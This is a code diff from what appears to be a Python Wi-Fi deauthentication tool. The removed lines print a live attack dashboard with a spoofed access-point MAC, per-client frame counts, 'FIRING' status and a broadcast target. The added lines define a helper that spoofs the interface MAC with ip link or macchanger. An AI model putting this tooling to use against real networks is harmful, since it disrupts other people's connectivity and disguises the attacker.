-    print(f"  {C.DIM}AP    :{C.RESET} {C.CYAN}{ssid}{C.RESET}  "
-          f"[{C.WHITE}{bssid}{C.RESET}]")
-    spoof_str = (f"{C.GREEN}YES{C.RESET} (interface MAC → {bssid})"
-                 if spoofed else f"{C.DIM}NO{C.RESET}")
-    print(f"  {C.DIM}Spoof :{C.RESET} {spoof_str}")
-    print(f"  {C.DIM}Status:{C.RESET} "
-          f"{C.RED}{bar_fill}{C.DIM}{bar_dim}{C.RESET}  "
-          f"Elapsed: {C.YELLOW}{elapsed:.0f}s{C.RESET}")
-    print(f"  {C.CYAN}{'─'*w}{C.RESET}")
-
-    # Column header
-    hdr = f"  {C.BOLD}{'TARGET MAC':<22} {'SENT':>9}  {'ACKS':>6}  STATUS{C.RESET}"
-    print(hdr)
-    print(f"  {'─'*w}")
-
-    total_sent = 0
-    total_acks = 0
-
-    for mac in clients:
-        s     = stats[mac]
-        sent  = s['sent']
-        acks  = s['acks']
-        total_sent += sent
-        total_acks += acks
-
-        proc  = s.get('proc')
-        alive = proc is not None and proc.poll() is None
-
-        status = (f"{C.GREEN}FIRING{C.RESET}" if alive
-                  else f"{C.DIM}DONE{C.RESET}")
-
-        mac_label = ('Broadcast (all)' if mac == 'FF:FF:FF:FF:FF:FF'
-                     else mac)
-        print(f"  {C.WHITE}{mac_label:<22}{C.RESET} "
-              f"{C.YELLOW}{sent:>9,}{C.RESET}  "
-              f"{C.GREEN}{acks:>6,}{C.RESET}  {status}")
-
-    print(f"  {'─'*w}")
-    print(f"  {'TOTAL':<22} {C.BOLD}{C.YELLOW}{total_sent:>9,}{C.RESET}  "
-          f"{C.BOLD}{C.GREEN}{total_acks:>6,}{C.RESET}")
-    print(f"  {C.CYAN}{'═'*w}{C.RESET}\n")
+def _spoof_mac(interface: str, new_mac: str) -> bool:
+    try:
+        subprocess.run(["ip", "link", "set", interface, "down"],   capture_output=True)
+        subprocess.run(["ip", "link", "set", interface, "address", new_mac], capture_output=True)
+        subprocess.run(["ip", "link", "set", interface, "up"],     capture_output=True)
+        return True
+    except Exception:
+        try:
+            subprocess.run(["macchanger", "-m", new_mac, interface], capture_output=True)
+            return True
+        except Exception:
+            return False
